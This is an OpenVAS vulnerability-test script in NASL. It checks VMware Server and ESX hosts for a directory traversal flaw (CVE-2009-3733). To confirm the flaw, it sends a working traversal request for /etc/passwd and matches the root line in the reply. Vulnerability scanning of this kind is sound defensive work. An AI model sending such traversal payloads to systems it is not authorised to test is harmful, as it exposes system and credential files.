###############################################################################
# OpenVAS Vulnerability Test
# $Id: vmware_36842_remote.nasl 44 2013-11-04 19:58:48Z jan $
#
# VMware Products Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote/local attacker to disclose
sensitive information.
Impact Level: System";
tag_affected = "VMware Server version 2.0.x prior to 2.0.2 Build 203138,
VMware Server version 1.0.x prior to 1.0.10 Build 203137 on Linux.";
tag_insight = "An error exists while handling certain requests can be exploited to download
arbitrary files from the host system via directory traversal attacks.";
tag_solution = "Upgrade your VMWares according to the below link,
http://www.vmware.com/security/advisories/VMSA-2009-0015.html";
tag_summary = "The host is installed with VMWare product(s) and is prone to multiple
vulnerability.";

if (description)
{
 script_id(100502);
 script_version("$Revision: 44 $");
 script_tag(name:"last_modification", value:"$Date: 2013-11-04 20:58:48 +0100 (Mo, 04. Nov 2013) $");
 script_tag(name:"creation_date", value:"2010-02-23 17:05:07 +0100 (Tue, 23 Feb 2010)");
 script_bugtraq_id(36842);
 script_cve_id("CVE-2009-3733");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"cvss_temporal", value:"3.4");
 script_tag(name:"risk_factor", value:"Medium");

 script_name("VMware Products Directory Traversal Vulnerability");

desc = "
 Summary:
 " + tag_summary + "

 Vulnerability Insight:
 " + tag_insight + "

 Impact:
 " + tag_impact + "

 Affected Software/OS:
 " + tag_affected + "

 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://secunia.com/advisories/37186");
 script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/3062");
 script_xref(name : "URL" , value : "http://securitytracker.com/alerts/2009/Oct/1023088.html");
 script_xref(name : "URL" , value : "http://lists.vmware.com/pipermail/security-announce/2009/000069.html");

 script_description(desc);
 script_summary("Determine if VMware is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("Remote file access");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_vmware_esx_web_detect.nasl","gb_vmware_esx_snmp_detect.nasl");
 script_require_ports("Services/www", 8222);
 script_require_keys("VMware/ESX/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
   script_tag(name : "insight" , value : tag_insight);
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (host_runs("windows") == "yes") exit(0); # only vmware running under linux is affected

port = get_http_port(default: 8222);
if(!port)port=8222;
if(!get_port_state(port))exit(0);

# check that it is vmware.
res = http_get_cache(item:"/", port:port);

# attack URL based on whether the target is esx/esxi or server
if("VMware ESX" >< res) {
  path = "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd";
} 
else if("<title>VMware Server" >< res) {
  path = "/sdk/../../../../../../etc/passwd";
} 
else {
  exit(0); # not vmware
}  

# check if port is redirected to ssl
req = http_get(item:"/ui/", port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(buf == NULL)exit(0);

ssl = FALSE;

if("Location: https://" >< buf) { # port is redirected...

  ssl = TRUE;
  port_match = eregmatch(pattern: "Location: https://.*:([0-9.]+)/ui/", string: buf);
  if(isnull(port_match[1]))exit(0);
  port = port_match[1];
  if(!get_port_state(port))exit(0);

} 

if(ssl) {
  transport = ENCAPS_SSLv3;
} else {
  transport = ENCAPS_IP;
}  

soc = open_sock_tcp(port, transport: transport);
if(!soc)exit(0);

req  = string("GET ", path  , "  HTTP/1.1\r\n");
req += string("TE: deflate,gzip;q=0.3\r\nConnection: TE, close\r\n");
req += string("Host: ",get_host_name(),":",port,"\r\n\r\n");

send(socket: soc, data: req);
buf = recv(socket:soc, length:8192);
close(soc);
if(buf == NULL)exit(0);

if(egrep(pattern:"root:.*:0:[01]:.*", string: buf)) {

  security_warning(port:port);
  set_kb_item(name: "VMware/Server/Linux/36842", value:TRUE);
  exit(0);

}  

exit(0);

